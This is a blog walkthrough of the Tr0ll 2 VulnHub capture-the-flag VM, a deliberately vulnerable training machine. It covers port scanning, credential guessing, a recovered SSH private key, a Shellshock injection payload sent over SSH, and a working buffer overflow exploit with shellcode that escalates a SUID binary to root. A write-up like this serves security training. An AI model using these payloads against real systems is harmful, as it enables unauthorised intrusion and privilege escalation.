---
layout: blog_item
title: "Tr0ll 2 Walkthrough"
date: "2015-01-02 02:12:52 +0200"
author: Arr0way
categories: [walkthroughs]
description: "Tr0ll: 2 walkthrough - step by step write up for Tr0ll: 2 a VulnHub Boot2Root challenge."
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}


I rooted Tr0ll 1, so thought it would be rude not to try the second VM in the Tr0ll series... [Tr0ll 2](https://www.vulnhub.com/entry/tr0ll-2,107/) requires a buffer overflow to perform local escalation, the first VM didn't require any exploitation. However, like the first VM I'd say this is challenege is more a case of guessing credentials, trying things you think probably wont work.  

### Description

<p><i>
The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)</i>
</p>

<p><i>
Difficulty is beginner++ to intermediate.
</i></p>


##Enumeration 

Enumeration process started. 

![Star Trek Enumeration](/img/kirk-enumeration.gif)

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">nmap -p 1-65535 -sV -sS -A -T4 172.31.31.6</span>
        </p>
          <span class="output"><br></span>
          <span class="output">Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-02 19:24 EST<br></span>
          <span class="output"><br></span>
          <span class="output">Host is up (0.0026s latency).<br></span>
          <span class="output">Not shown: 65532 closed ports<br></span>
          <span class="output">PORT   STATE SERVICE VERSION <br></span> 
          <span class="output">21/tcp open  ftp     vsftpd 2.0.8 or later<br></span>
          <span class="output">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br></span>
          <span class="output">| ssh-hostkey: <br></span>
          <span class="output">22/tcp open  ssh     (protocol 2.0)<br></span>
          <span class="output">| ssh-hostkey: <br></span>
          <span class="output">|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)<br></span>
          <span class="output">|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)<br></span>
          <span class="output">|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)<br></span>
          <span class="output">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br></span>
          <span class="output">|_http-title: Site doesn't have a title (text/html).<br></span>
          <span class="output">Device type: general purpose<br></span>
          <span class="output">Running: Linux 3.X<br></span>
          <span class="output">OS CPE: cpe:/o:linux:linux_kernel:3<br></span>
          <span class="output">OS details: Linux 3.2 - 3.8<br></span>
          <span class="output">Network Distance: 2 hops<br></span>
          <span class="output">Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></span>
          <span class="output"><br></span>
          <span class="output">OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .<br></span>
          <span class="output">Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds<br></span>
        </p>
      </div>
    </div>
</section>

###Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 21</code></p></pc>
           </td>
           <td>
               <pc><p>FTP</p></pc>
           </td>
           <td>
               <pc><p>vsftpd 2.0.8 or later</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
              <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.22 ((Ubuntu))</p></pc>
           </td>
        </tr>
      </tbody>
</table>
</div> 

###SSH Enumeration

Zoning out watching my Nmap scan complete I noticed, the hostname was Tr0ll. I attempted to login via ssh with <code>Tr0ll</code> password: <code>Tr0ll</code>, it worked ! But I instantly got booted off, tried a few things nothing worked... So I tried FTP.  

###FTP Enumeration

I tired the same credentials against ftp and discovered a file called "noob" in the ftp root. 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">ftp noob</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">ftp 172.31.31.6</span></p>
          <span class="output"><br></span>
          <span class="output">Connected to 172.31.31.6<br></span>
          <span class="output">220 Welcome to Tr0ll FTP... Only noobs stay for a while...<br></span>
          <span class="output">Name (172.31.31.6:root): Tr0ll<br></span>
          <span class="output">331 Please specify the password.<br></span> 
          <span class="output">Password:<br></span> 
          <span class="output">230 Login successful.<br></span>
          <span class="output">Remote system type is UNIX.<br></span>
          <span class="output">Using binary mode to transfer files.<br></span>
          <span class="output">ftp> get lmao.zip<br></span>
          <span class="output">local: lol.pcap remote: lol.pcap<br></span>
          <span class="output">200 PORT command successful. Consider using PASV.<br></span>
          <span class="output">150 Opening BINARY mode data connection for lmao.zip (1474 bytes).<br></span>
          <span class="output">226 Transfer complete.<br></span>
          <span class="output">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br></span>
          <span class="output">1474 bytes received in 0.02 secs (60.6 kB/s)<br></span>
          <span class="output">ftp> exit<br></span>
          <span class="output">221 Goodbye.<br></span>
        </p>
      </div>
    </div>
</section>

Attempting to extract lmao.zip failed, prompting for a <code>noob</code> password. 

Onto the next service then... 

###HTTP Enumeration 

![Star Trek HTTP Enumeration](/img/star-trek-enumeration.gif)

Web browser showed: 

![tr0ll me again](/img/blog/tr0ll-me-again.PNG) 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">nmap --script=http-enum -p80 -n 172.31.31.6</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">nmap --script=http-enum -p80 -n 172.31.31.6</span></p>
          <span class="output"><br></span>
          <span class="output">Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-2 18:40 GMT<br></span>
          <span class="output">Nmap scan report for 172.31.31.6<br></span>
          <span class="output">Host is up (0.00046s latency).<br></span>
          <span class="output">PORT   STATE SERVICE<br></span>
          <span class="output">80/tcp open  http<br></span> 
          <span class="output">| http-enum:<br></span>
          <span class="output">|   /robots.txt: Robots file<br></span>
          <span class="output"><br></span>
          <span class="output">Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds<br></span>
        </p>
      </div>
    </div>
</section>

Entering /robots.txt url in the browser rendered: 

{% highlight bash %}

User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop

{% endhighlight %}


The slash was stripped off with some sed <code>sed 's./..g' robots.txt</code> dirb was then used to check the following urls. 

{% highlight bash %}
-----------------
DIRB v2.21    
By The Dark Raver
-----------------

START_TIME: Sat Jan  3 08:08:15 2015
URL_BASE: http://172.31.31.6/
WORDLIST_FILES: robots.txt

-----------------

GENERATED WORDS: 21                                                            

---- Scanning URL: http://172.31.31.6/ ----
+ http://172.31.31.6//noob (CODE:301|SIZE:309)                                                                               
+ http://172.31.31.6//keep_trying (CODE:301|SIZE:316)                                                                        
+ http://172.31.31.6//dont_bother (CODE:301|SIZE:316)                                                                        
+ http://172.31.31.6//ok_this_is_it (CODE:301|SIZE:318)                                                                      
                                                                                                                             
-----------------
DOWNLOADED: 21 - FOUND: 4
{% endhighlight %}

They all rendered the same image (301'd).  

![tr0ll cats](/img/blog/tr0ll-cats.PNG)

Nothing exciting was in the page source: 

{% highlight bash %}
What did you really think to find here? Try Harder
{% endhighlight %}

<code>cat_the_troll.jpg</code> was downloaded from all the above locations from the target and examined. 

ls -la showed a slightly different file size for one of the images, I began by running each of the files through cat (cating the cat? - sorry). 

{% highlight bash %}
8?z2??p?T?lj\p????<?S?۪?6?#???7U y????*/ p?E$???%=???.?B???o?ES_??Look Deep within y0ur_self for the answer
{% endhighlight %}

I tired this against the previously downloaded <code>lmao.zip</code> file, no luck. I tried <code>y0ur_self</code> as web path like on tr0ll:1 

Success, the web dir contained a text file <code>http://172.31.31.6/y0ur_self/answer.txt</code> scrolling though from the browser it looked like the file was base64 encoded. 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">wget http://172.31.31.6/y0ur_self/answer.txt</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">wget http://172.31.31.6/y0ur_self/answer.txt</span></p>
          <span class="output"><br></span>
        </p>
      </div>
    </div>
</section>

Decoding the file revealed it was massive, the following was used to decode and sort by line length:

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">base64 decoding</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">base64 -d answer.txt > answer-decoded.txt && awk '{print length, $0;}' answer-decoded.txt | sort -nr | less</span></p>
          <span class="output"><br></span>
          <span class="output"><br>30 ItCantReallyBeThisEasyRightLOL</span>
        </p>
      </div>
    </div>
</section>

The top line looked promising, <code>ItCantReallyBeThisEasyRightLOL</code> I tried this against <code>lmao.zip</code> 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">unzip lmao.zip</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">unzip lmao.zip</span></p>
          <span class="output">Archive:  lmao.zip<br></span>
          <span class="output">[lmao.zip] noob password:<br></span>
          <span class="output">  inflating: noob <br></span>
        </p>
      </div>
    </div>
</section>

![Data Yes Fist](\img\data-yes-fist.gif)

Yes!

The contents of <code>noob</code> 

{% highlight bash %}
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
{% endhighlight %}

### SSH Shellshock

Attempting to login using the discovered key failed, with a messaging saying <code>TRY HARDER LOL!</code>. 

![Vulcan Rage Quit](\img\vulcan-ragequit.gif)

I tried to feed it commands by tagging them on the end, the connection hung then dropped with no message. 

I googled some shellshock options and managed to spawn a shell with: 

<code>ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'</code>

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">shellshock ssh</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">ssh -i noob noob@192.168.145.129 '() { :;}; /bin/bash'</span></p>
          <span class="output"><br></span>
          <span class="output">id<br></span>
          <span class="output">uid=1002(noob) gid=1002(noob) groups=1002(noob)<br></span>
        </p>
      </div>
    </div>
</section>


##Local Enumeration

Transfered my local enumeration script to the target, disclosing the following odd sticky bit files: 

{% highlight bash %}
#########################################
## Sticky Bit                          ##
#########################################

drwsr-xr-x 3 root root 4096 Dec 29 19:00 /nothing_to_see_here
drwsr-xr-x 5 root root 4096 Oct  4 22:36 /nothing_to_see_here/choose_wisely
drwsr-xr-x 2 root root 4096 Oct  5 21:19 /nothing_to_see_here/choose_wisely/door2
drwsr-xr-x 2 root root 4096 Oct  5 21:18 /nothing_to_see_here/choose_wisely/door3
drwsr-xr-x 2 root root 4096 Oct  4 22:19 /nothing_to_see_here/choose_wisely/door1
{% endhighlight %}

Each of the door directories contained a file called r00t, du -sh * in the parent dir <code>choose_wisely</code> showed one of the files was larger - I started there. 

<code>od -S 1 r00t</code> was used against each of the files, the larget file contained: 

{% highlight bash %}
0017545 bof.c
0017553 __init_array_end
0017574 _DYNAMIC
0017605 __init_array_start
0017630 _GLOBAL_OFFSET_TABLE_
0017656 __libc_csu_fini
0017676 __i686.get_pc_thunk.bx
0017725 data_start
0017740 printf@@GLIBC_2.0
0017762 _edata
0017771 _fini
0017777 strcpy@@GLIBC_2.0
0020021 __DTOR_END__
0020036 __data_start
0020053 __gmon_start__
0020072 exit@@GLIBC_2.0
0020112 __dso_handle
0020127 _IO_stdin_used
0020146 __libc_start_main@@GLIBC_2.0
0020203 __libc_csu_init
{% endhighlight %}

bof.c - pretty good indication that Buffer Overflow was the next logical step (unless it's more tr0ling). 

##Exploit Development

###Fuzzing 

I started by fuzzing with 300 A's: 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">fuzzing linux binary</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">./r00t $(python -c 'print "A" *300')</span></p>
          <span class="output"><br></span>
          <span class="output">Segmentation fault<br></span>
        </p>
      </div>
    </div>
</section>

Bangin' then I tried 250 no crash, adding 10 each time then subtracting when the seg fault occoured at 268 and the instruction pointer address at 269 <code>Illegal instruction</code>. 

Using gdb I located the address of ESP. 

{% highlight bash %}
(gdb) i r esp
esp            0xbffffb80 0xbffffb80
{% endhighlight %}

Padded with some NOPs - for a reliable landing. 

![Worf jump](\img\warf-jump.gif)

Overwrote EIP with the location of ESP and tagged some shellcode on the end to exectute a shell. 

###Final Exploit

{% highlight bash %}
./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
{% endhighlight %}

Note: gdb drops privileges on SUID, in order to spawn the new shell with SUID you need to execute the exploit outside of gdb, or the shell will spawn as the unprivileged user.

The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the vulnerable binary. 

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">Exploit Process</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">du -sh *<br></span>
        </p>
        <p class="line">
          <span class="output">12K door1<br></span>
        </p>
        <p class="line">
          <span class="output">12K door2<br></span>
        </p>
        <p class="line">
          <span class="output">16K door3<br></span>
        </p>
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">cd door3<br></span>
        </p>
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * <br>10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\<br>xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')</span>
        </p>
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">whoami<br></span>
          <span class="output">root<br></span>
          <span class="output"><br></span>
        </p>
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">cat /root/Proof.txt<br></span>
          <span class="output">You win this time young Jedi...</span>
          <span class="output"><br></span>
          <span class="output">a70354f0258dcc00292c72aab3c8b1e4<br></span>
        </p>
      </div>
    </div>
</section>


##Root dance 

![Root Dance](\img\girl-dancing-excited.gif)

##Thanks 

Thanks to [@maleus21](https://twitter.com/@maleus21) for creating this VM challenege.